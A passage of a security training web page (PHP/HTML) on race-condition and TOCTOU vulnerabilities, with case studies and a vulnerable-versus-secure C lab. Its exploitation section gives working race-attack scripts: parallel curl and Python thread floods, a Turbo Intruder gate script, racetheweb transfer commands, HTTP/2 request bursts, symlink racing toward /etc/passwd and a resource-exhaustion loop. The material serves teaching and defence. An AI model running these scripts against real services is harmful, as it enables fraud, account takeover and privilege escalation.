<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;
$pageTitle = "Race Conditions & TOCTOU - Complete Guide | DarkHunter";
$currentPage = "race-condition-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Race Condition vulnerabilities - Understanding TOCTOU attacks, exploitation techniques, and implementing robust defenses. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/race-condition-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Race Conditions & TOCTOU Vulnerabilities</h1>
        <p class="page-subtitle">
          Master Race Condition vulnerabilities - Learn how attackers exploit timing windows between security checks and
          operations, from TOCTOU attacks to business logic bypasses. Understand defense strategies to build atomic,
          thread-safe systems.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What are Race Conditions?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What are Race Conditions & TOCTOU?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> A Race Condition occurs when multiple processes or threads access shared
          resources concurrently, and the outcome depends on the timing of their execution. Time-of-Check to Time-of-Use
          (TOCTOU) is a specific race condition where an attacker exploits the gap between when a program checks a
          condition and when it acts on that check, manipulating state in between to bypass security controls.
        </div>

        <p class="text-content">
          Race conditions are among the most subtle and dangerous vulnerabilities in software security. Unlike injection
          attacks that exploit input validation flaws, race conditions exploit the fundamental nature of concurrent
          execution. When an application performs a security check at one moment and uses the result later, a tiny
          timing window opens—measured in milliseconds or even microseconds—where an attacker can change the underlying
          state, causing the application to act on false assumptions.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> Race conditions can lead to privilege escalation, authentication bypass,
          double-spending in financial systems, data corruption, unauthorized file access, account takeover, and
          complete system compromise. In multi-threaded web applications, cloud services, and containerized
          environments, these vulnerabilities can be remotely exploited with devastating consequences.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 6.5 - 9.8 (Medium to Critical)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable for web apps) / Local (for file system
              races)</li>
            <li><strong>Attack Complexity:</strong> High (requires precise timing and multiple attempts)</li>
            <li><strong>Privileges Required:</strong> Low to None (depends on target functionality)</li>
            <li><strong>User Interaction:</strong> None (automated exploitation possible)</li>
            <li><strong>Scope:</strong> Unchanged to Changed (can affect other components)</li>
            <li><strong>Impact:</strong> High on Integrity and Confidentiality, Medium on Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of Race Conditions</h3>
        <p class="text-content">
          Race conditions manifest in various forms depending on the context and shared resources involved:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Description</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">TOCTOU (File)</td>
              <td style="padding: 0.75rem;">Check file permissions, then use file—attacker swaps in between</td>
              <td style="padding: 0.75rem;">Privilege escalation, arbitrary file write</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Data Races</td>
              <td style="padding: 0.75rem;">Multiple threads modify shared memory without synchronization</td>
              <td style="padding: 0.75rem;">Data corruption, logic bypass</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Business Logic</td>
              <td style="padding: 0.75rem;">Concurrent API calls bypass single-use limits</td>
              <td style="padding: 0.75rem;">Double-spending, coupon reuse, limit bypass</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Authentication</td>
              <td style="padding: 0.75rem;">Race between login attempts and session creation</td>
              <td style="padding: 0.75rem;">Account takeover, session fixation</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Deadlock/Livelock</td>
              <td style="padding: 0.75rem;">Improper synchronization causes system freeze</td>
              <td style="padding: 0.75rem;">Denial of Service</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 TOCTOU Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Check Operation → Race Window → Manipulation → Use Operation → Compromise]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How Race Conditions Work: Technical Deep Dive</h2>

        <h3 class="subsection-title">The TOCTOU Pattern</h3>
        <p class="text-content">
          The classic TOCTOU vulnerability follows a predictable pattern: a program checks a resource's state
          (Time-of-Check), then later acts on that resource (Time-of-Use), assuming the state hasn't changed. In the gap
          between these operations—the "race window"—an attacker can modify the resource, invalidating the original
          check.
        </p>

        <div class="highlight-box">
          <strong>Vulnerability Pattern:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Application checks a condition (file exists, user has permission, balance is sufficient)</li>
            <li>Application proceeds based on check result (race window opens)</li>
            <li>Attacker modifies the resource state (swaps file, changes permission, drains balance)</li>
            <li>Application uses the resource based on stale check data</li>
            <li><strong>Result:</strong> Action performed under false assumptions, security bypass achieved</li>
          </ol>
        </div>

        <h3 class="subsection-title">Common TOCTOU Entry Points</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Common Vulnerable Patterns</span></div>
          <pre><code><span class="code-comment">-- File permission check then open</span>
<span class="code-keyword">if</span> (access(<span class="code-string">"/tmp/userfile"</span>, W_OK) == <span class="code-keyword">0</span>) {
    <span class="code-comment">// Race window: attacker swaps file here</span>
    fd = open(<span class="code-string">"/tmp/userfile"</span>, O_WRONLY);  <span class="code-comment">// Opens attacker's target</span>
    write(fd, data, len);  <span class="code-comment">// Writes to /etc/passwd!</span>
}

<span class="code-comment">-- Balance check then transfer</span>
<span class="code-keyword">if</span> (user.balance >= amount) {
    <span class="code-comment">// Race window: concurrent request drains balance</span>
    user.balance -= amount;  <span class="code-comment">// Now negative!</span>
    process_transfer();
}

<span class="code-comment">-- Single-use token validation</span>
<span class="code-keyword">if</span> (!token.is_used) {
    <span class="code-comment">// Race window: second request passes same check</span>
    token.is_used = <span class="code-keyword">true</span>;  <span class="code-comment">// Both requests see false!</span>
    grant_access();
}

<span class="code-comment">-- Password reset token validation</span>
<span class="code-keyword">if</span> (reset_token.valid) {
    <span class="code-comment">// Race window: attacker sends parallel requests</span>
    change_password();  <span class="code-comment">// Multiple password changes allowed</span>
    invalidate_token();  <span class="code-comment">// Too late!</span>
}</code></pre>
        </div>

        <h3 class="subsection-title">The Race Window</h3>
        <p class="text-content">
          The race window is the critical time gap between check and use. Attackers employ various techniques to widen
          this window or increase their probability of hitting it.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Race Window Exploitation Techniques</span></div>
          <pre><code><span class="code-comment">-- Technique 1: Resource exhaustion to slow target</span>
<span class="code-keyword">while</span> (<span class="code-keyword">true</span>) {
    fork();  <span class="code-comment">-- Consume CPU</span>
    malloc(<span class="code-keyword">1024</span>*<span class="code-keyword">1024</span>);  <span class="code-comment">-- Consume memory</span>
    write(large_file);  <span class="code-comment">-- Consume I/O</span>
}
<span class="code-comment">-- Slows victim process, widening race window</span>

<span class="code-comment">-- Technique 2: Symlink racing (brute force)</span>
<span class="code-keyword">while</span> (<span class="code-keyword">true</span>) {
    ln -sf /tmp/benign /tmp/target;
    ln -sf /etc/passwd /tmp/target;  <span class="code-comment">-- Switch at right moment</span>
    unlink /tmp/target;
}

<span class="code-comment">-- Technique 3: Parallel request flooding</span>
<span class="code-keyword">for</span> i <span class="code-keyword">in</span> {1..50}; <span class="code-keyword">do</span>
    curl -X POST <span class="code-string">"https://api.example.com/redeem"</span> \
         -d <span class="code-string">"coupon=SAVE20"</span> &  <span class="code-comment">-- Background parallel</span>
<span class="code-keyword">done</span>
<span class="code-comment">-- Multiple threads hit check simultaneously</span></code></pre>
        </div>

        <h3 class="subsection-title">Web Application Race Conditions</h3>
        <p class="text-content">
          Modern web applications are particularly vulnerable to race conditions due to their concurrent, multi-threaded
          nature. Database operations, cache updates, and session management all present opportunities for TOCTOU
          attacks.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Web App Race Vectors</span></div>
          <pre><code><span class="code-comment">-- Coupon redemption race</span>
<span class="code-keyword">POST</span> /api/redeem-coupon
{<span class="code-attr">"code"</span>: <span class="code-string">"DISCOUNT50"</span>, <span class="code-attr">"user_id"</span>: <span class="code-keyword">123</span>}

<span class="code-comment">-- Server logic (vulnerable):</span>
<span class="code-keyword">1.</span> SELECT * FROM coupons WHERE code = 'DISCOUNT50' AND used = false
<span class="code-comment">   -- Race: Both queries return same row</span>
<span class="code-keyword">2.</span> UPDATE coupons SET used = true WHERE code = 'DISCOUNT50'
<span class="code-comment">   -- Both updates succeed, but discount applied twice!</span>

<span class="code-comment">-- Balance transfer race</span>
<span class="code-keyword">POST</span> /api/transfer
{<span class="code-attr">"from"</span>: <span class="code-string">"account_A"</span>, <span class="code-attr">"to"</span>: <span class="code-string">"account_B"</span>, <span class="code-attr">"amount"</span>: <span class="code-keyword">100</span>}

<span class="code-comment">-- Vulnerable sequence:</span>
<span class="code-keyword">1.</span> SELECT balance FROM accounts WHERE id = 'account_A'
<span class="code-keyword">2.</span> <span class="code-comment">-- Race: Parallel transfer also reads same balance</span>
<span class="code-keyword">3.</span> UPDATE accounts SET balance = balance - 100 WHERE id = 'account_A'
<span class="code-comment">-- Both transfers succeed, account goes negative!</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🎯</div>
            <div class="flow-label">Identify Check</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Find check-then-use pattern</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">⏱️</div>
            <div class="flow-label">Measure Window</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Analyze timing gaps</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">⚡</div>
            <div class="flow-label">Parallel Attack</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Flood with requests</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🔄</div>
            <div class="flow-label">State Manipulation</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Change resource mid-flight</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💀</div>
            <div class="flow-label">Win Race</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Exploit achieved</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting Race Conditions</h2>

        <h3 class="subsection-title">Step 1: Identify Race-Prone Functionality</h3>
        <p class="text-content">
          Map application features that involve multi-step operations, single-use resources, or state transitions. Look
          for operations that should happen atomically but are implemented as separate steps.
        </p>

        <div class="highlight-box">
          <strong>High-Value Targets for Race Condition Testing:</strong>
          <ul style="margin-left: 2rem;">
            <li><strong>Single-use tokens:</strong> Password reset links, email verification, OTP codes, promo codes
            </li>
            <li><strong>Financial operations:</strong> Balance transfers, coupon redemption, credit applications,
              refunds</li>
            <li><strong>Account modifications:</strong> Email changes, password updates, privilege escalation</li>
            <li><strong>Inventory systems:</strong> Limited stock purchases, ticket booking, voting systems</li>
            <li><strong>File operations:</strong> Upload processing, temporary file handling, log rotation</li>
            <li><strong>Multi-step workflows:</strong> Checkout processes, approval chains, batch operations</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Detect Race Windows</h3>
        <p class="text-content">
          Analyze the application's behavior under concurrent load. Look for timing anomalies, inconsistent responses,
          or state corruption.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Race Detection Techniques</span></div>
          <pre><code><span class="code-comment">-- Manual testing with browser dev tools</span>
<span class="code-comment">-- Open two tabs, perform action simultaneously</span>

<span class="code-comment">-- Quick curl parallel test</span>
<span class="code-keyword">for</span> i <span class="code-keyword">in</span> {1..10}; <span class="code-keyword">do</span>
    curl -s <span class="code-string">"https://target.com/api/action"</span> \
         -H <span class="code-string">"Cookie: session=abc123"</span> \
         -d <span class="code-string">"param=value"</span> & 
<span class="code-keyword">done</span>; wait

<span class="code-comment">-- Python threading for precise timing</span>
<span class="code-keyword">import</span> threading
<span class="code-keyword">import</span> requests

<span class="code-keyword">def</span> <span class="code-function">race_request</span>():
    resp = requests.post(
        <span class="code-string">"https://target.com/api/redeem"</span>,
        headers={<span class="code-string">"Authorization"</span>: <span class="code-string">"Bearer TOKEN"</span>},
        json={<span class="code-string">"coupon"</span>: <span class="code-string">"SAVE20"</span>},
        timeout=<span class="code-keyword">5</span>
    )
    <span class="code-function">print</span>(<span class="code-string">f"Status: {resp.status_code}, Body: {resp.text[:100]}"</span>)

<span class="code-comment">-- Launch 20 threads simultaneously</span>
threads = []
<span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">20</span>):
    t = threading.Thread(target=race_request)
    threads.append(t)
    t.start()

<span class="code-keyword">for</span> t <span class="code-keyword">in</span> threads:
    t.join()</code></pre>
        </div>

        <h3 class="Step 3: Exploit with Specialized Tools</h3>
        <p class=" text-content">
          Professional race condition exploitation requires tools that can send requests with microsecond precision and
          synchronize multiple connections.
          </p>

          <div class="code-block code-vulnerable">
            <div class="code-header"><span class="code-label">Turbo Intruder Race Script</span></div>
            <pre><code><span class="code-keyword">def</span> <span class="code-function">queueRequests</span>(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=<span class="code-keyword">30</span>,
                          requestsPerConnection=<span class="code-keyword">100</span>,
                          pipeline=<span class="code-keyword">False</span>
                          )
    
    <span class="code-comment">-- Queue 50 identical requests</span>
    <span class="code-keyword">for</span> i <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">50</span>):
        engine.queue(target.req, target.baseInput, gate=<span class="code-string">'race1'</span>)
    
    <span class="code-comment">-- Open gate to release all simultaneously</span>
    engine.openGate(<span class="code-string">'race1'</span>)
    engine.complete(timeout=<span class="code-keyword">60</span>)

<span class="code-keyword">def</span> <span class="code-function">handleResponse</span>(req, interesting):
    table.add(req)</code></pre>
          </div>

          <div class="code-block code-vulnerable">
            <div class="code-header"><span class="code-label">Race The Web Tool</span></div>
            <pre><code><span class="code-comment">-- Install: pip install racetheweb</span>

<span class="code-comment">-- Basic race attack</span>
racetheweb -u <span class="code-string">"https://target.com/api/transfer"</span> \
           -d <span class="code-string">"amount=100&to=attacker"</span> \
           -H <span class="code-string">"Cookie: session=abc123"</span> \
           -n <span class="code-keyword">50</span> \
           --threads <span class="code-keyword">20</span>

<span class="code-comment">-- With last-byte synchronization</span>
racetheweb -u <span class="code-string">"https://target.com/api/redeem"</span> \
           -d <span class="code-string">"coupon=LIMITED1"</span> \
           -H <span class="code-string">"Authorization: Bearer TOKEN"</span> \
           -n <span class="code-keyword">100</span> \
           --last-byte-sync</code></pre>
          </div>

          <h3 class="subsection-title">Step 4: HTTP/2 Single-Packet Attack</h3>
          <p class="text-content">
            HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, virtually eliminating network
            jitter and ensuring true simultaneous processing.
          </p>

          <div class="code-block code-vulnerable">
            <div class="code-header"><span class="code-label">HTTP/2 Single-Packet Exploit</span></div>
            <pre><code><span class="code-comment">-- Using Burp Repeater with HTTP/2</span>
<span class="code-comment">-- 1. Enable HTTP/2 in Project Options</span>
<span class="code-comment">-- 2. Create group of requests (Ctrl+Click)</span>
<span class="code-comment">-- 3. Right-click → Send Group in Parallel</span>

<span class="code-comment">-- Python with hyper library</span>
<span class="code-keyword">from</span> hyper <span class="code-keyword">import</span> HTTPConnection

conn = HTTPConnection(<span class="code-string">'target.com:443'</span>)

<span class="code-comment">-- Prepare multiple requests</span>
requests = [
    (<span class="code-string">'POST'</span>, <span class="code-string">'/api/redeem'</span>, {<span class="code-string">'coupon'</span>: <span class="code-string">'SAVE20'</span>}, headers)
    <span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">10</span>)
]

<span class="code-comment">-- Send all in single packet burst</span>
stream_ids = []
<span class="code-keyword">for</span> method, path, body, hdrs <span class="code-keyword">in</span> requests:
    stream_id = conn.request(method, path, body=body, headers=hdrs)
    stream_ids.append(stream_id)

<span class="code-comment">-- Read all responses</span>
responses = [conn.get_response(sid) <span class="code-keyword">for</span> sid <span class="code-keyword">in</span> stream_ids]</code></pre>
          </div>

          <h3 class="subsection-title">Step 5: Confirm and Escalate</h3>
          <p class="text-content">
            Verify successful exploitation by checking server-side state changes. A successful race condition often
            shows subtle differences between responses.
          </p>

          <div class="code-block">
            <div class="code-header"><span class="code-label">Verification Checklist</span></div>
            <pre><code><span class="code-comment">-- Check for duplicate effects:</span>
<span class="code-keyword">SELECT</span> COUNT(*) <span class="code-keyword">FROM</span> transactions 
<span class="code-keyword">WHERE</span> user_id = <span class="code-keyword">123</span> <span class="code-keyword">AND</span> coupon_code = <span class="code-string">'SAVE20'</span>;
<span class="code-comment">-- Should be 1, if >1 then race succeeded</span>

<span class="code-comment">-- Check balance consistency:</span>
<span class="code-keyword">SELECT</span> balance <span class="code-keyword">FROM</span> accounts <span class="code-keyword">WHERE</span> id = <span class="code-string">'user_123'</span>;
<span class="code-comment">-- Should match expected after single transfer</span>

<span class="code-comment">-- Check token reuse:</span>
<span class="code-keyword">SELECT</span> COUNT(*) <span class="code-keyword">FROM</span> password_resets 
<span class="code-keyword">WHERE</span> token = <span class="code-string">'abc123'</span> <span class="code-keyword">AND</span> used = <span class="code-keyword">true</span>;
<span class="code-comment">-- Should be 1, if race worked, multiple password changes occurred</span></code></pre>
          </div>

          <div class="diagram-container">
            <div class="diagram-label">🎬 Video: Race Condition Exploitation with Turbo Intruder</div>
            <div class="video-placeholder">
              <i>▶️</i><br>
              [Insert Video: Step-by-step race condition exploitation from detection to account takeover]
            </div>
          </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious Race Condition Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Docker Container Breakout (CVE-2018-15664)</h3>
        <p class="text-content">
          A critical TOCTOU vulnerability in Docker's cp command allowed container escape. When copying files between
          host and container, Docker would resolve the path inside the container, then later use that path on the host.
          Attackers could insert a malicious symlink during this window, tricking Docker into copying arbitrary host
          files.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Attackers with minimal container access could read/write any file on the host
          filesystem as root. This turned container isolation into a privilege escalation vector, compromising entire
          host systems from within containers.
        </div>

        <h3 class="subsection-title">Case Study 2: Drupal Password Reset Race (SA-CORE-2015-004)</h3>
        <p class="text-content">
          Drupal had a vulnerability where password reset links could be used multiple times if requests were sent in
          rapid succession. The application checked token validity, then processed the reset, then invalidated the
          token—allowing parallel requests to pass the check before invalidation occurred.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Attacker intercepts password reset email → Sends 50 parallel reset requests
          with same token → Multiple requests succeed before token invalidation → Account takeover achieved.
        </div>

        <h3 class="subsection-title">Case Study 3: Uber OTP Bypass (Bug Bounty)</h3>
        <p class="text-content">
          Security researchers discovered a race condition in Uber's email change verification flow. The application
          sent an OTP to the new email, then verified it in a separate step. By sending the email change request and OTP
          verification simultaneously using HTTP/2 single-packet attack, attackers could verify email ownership without
          access to the victim's inbox.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Account takeover without email access. The race allowed bypassing the critical email
          verification step, enabling attackers to change account emails and reset passwords at will.
        </div>

        <h3 class="subsection-title">Case Study 4: Sendmail /etc/passwd Modification</h3>
        <p class="text-content">
          A classic TOCTOU vulnerability in Sendmail allowed local privilege escalation. The setuid root program checked
          file permissions on a temporary file, then opened it for writing. Attackers used symlink racing to replace the
          temporary file with /etc/passwd between check and open, adding backdoor root accounts.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Local users could gain root privileges by exploiting the microseconds-long window
          between permission check and file open, demonstrating how even ancient TOCTOU patterns remain dangerous.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Race Condition Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Fintech</td>
              <td style="padding: 0.75rem;">Double-spending via concurrent transfer requests</td>
              <td style="padding: 0.75rem;">Financial loss, regulatory violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Coupon reuse, inventory overselling</td>
              <td style="padding: 0.75rem;">Revenue loss, stock inconsistencies</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Gaming</td>
              <td style="padding: 0.75rem;">Currency duplication, item cloning</td>
              <td style="padding: 0.75rem;">Economy inflation, unfair advantage</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cloud/DevOps</td>
              <td style="padding: 0.75rem;">Container escape via file race</td>
              <td style="padding: 0.75rem;">Infrastructure compromise</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">SaaS</td>
              <td style="padding: 0.75rem;">Plan upgrade bypass, limit circumvention</td>
              <td style="padding: 0.75rem;">Revenue loss, resource abuse</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper synchronization enables race condition attacks,
          then implement atomic operations, proper locking, and database-level constraints to eliminate race windows.
        </div>

        <h3 class="subsection-title">Lab 1: TOCTOU File Operation Vulnerability</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Separate check and use operations on filesystem.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable C Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-comment">// Vulnerable TOCTOU in setuid root program</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;unistd.h&gt;</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;fcntl.h&gt;</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;stdio.h&gt;</span>

<span class="code-keyword">void</span> <span class="code-function">write_log</span>(<span class="code-keyword">const char</span>* userfile, <span class="code-keyword">const char</span>* data) {
    <span class="code-comment">// TOCTOU: Check permissions</span>
    <span class="code-keyword">if</span> (access(userfile, W_OK) != <span class="code-keyword">0</span>) {
        perror(<span class="code-string">"Access denied"</span>);
        <span class="code-keyword">return</span>;
    }
    
    <span class="code-comment">// RACE WINDOW: Attacker swaps file here!</span>
    <span class="code-comment">// symlink("/etc/passwd", userfile);</span>
    
    <span class="code-comment">// TOCTOU: Use the file (now possibly different!)</span>
    <span class="code-keyword">int</span> fd = open(userfile, O_WRONLY | O_APPEND);
    <span class="code-keyword">if</span> (fd < <span class="code-keyword">0</span>) {
        perror(<span class="code-string">"Open failed"</span>);
        <span class="code-keyword">return</span>;
    }
    
    write(fd, data, strlen(data));
    close(fd);
    <span class="code-comment">// If userfile was swapped to /etc/passwd, we just modified system passwords!</span>
}</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">#include</span> <span class="code-string">&lt;unistd.h&gt;</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;fcntl.h&gt;</span>
<span class="code-keyword">#include</span> <span class="code-string">&lt;sys/stat.h&gt;</span>

<span class="code-keyword">void</span> <span class="code-function">write_log_secure</span>(<span class="code-keyword">const char</span>* userfile, <span class="code-keyword">const char</span>* data) {
    <span class="code-keyword">int</span> fd;
    <span class="code-keyword">struct</span> stat st;
    
    <span class="code-comment">// Method 1: Use file descriptor-based operations (atomic)</span>
    fd = open(userfile, O_WRONLY | O_APPEND | O_NOFOLLOW);
    <span class="code-keyword">if</span> (fd < <span class="code-keyword">0</span>) {
        perror(<span class="code-string">"Open failed"</span>);
        <span class="code-keyword">return</span>;
    }
    
    <span class="code-comment">// Verify it's a regular file (not symlink) after open</span>
    <span class="code-keyword">if</span> (fstat(fd, &st) != <span class="code-keyword">0</span> || !S_ISREG(st.st_mode)) {
        close(fd);
        fprintf(stderr, <span class="code-string">"Not a regular file\n"</span>);
        <span class="code-keyword">return</span>;
    }
    
    <span class="code-comment">// Check ownership (optional security check)</span>
    <span class="code-keyword">if</span> (st.st_uid != getuid()) {
        close(fd);
        fprintf(stderr, <span class="code-string">"Ownership mismatch\n"</span>);
        <span class="code-keyword">return</span>;
    }
    
    <span class="code-comment">// Write through file descriptor (guaranteed same file)</span>
    write(fd, data, strlen(data));
    close(fd);
}

<span class="code-comment">// Method 2: Create file atomically with O_CREAT | O_EXCL</span>
<span class="code-keyword">void</span> <span class="code-function">create_secure_temp</span>(<span class="code-keyword">const char</span>* path) {
